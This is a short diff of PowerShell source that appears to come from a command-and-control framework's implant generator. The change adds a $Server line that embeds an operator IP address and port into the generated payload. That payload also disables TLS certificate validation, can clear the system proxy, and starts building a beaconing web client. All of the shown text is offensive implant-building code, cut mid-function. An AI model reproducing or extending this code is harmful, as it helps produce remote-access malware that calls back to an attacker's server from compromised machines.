@@ -3,13 +3,16 @@
 
 if ($Daisy) { 
     $connect="daisy"
+    $server = "`$Server = `"$($ipv4address):$($serverport)`""
     $proxynone = "if (!`$proxyurl){`$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
 } else { 
     $proxynone = ""
+    $server = ""
     $connect="connect" 
 }
 
 $command = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+'+$server+'
 function Get-Webclient ($Cookie) {
 $d = (Get-Date -Format "dd/MM/yyyy");
 $d = [datetime]::ParseExact($d,"dd/MM/yyyy",$null);
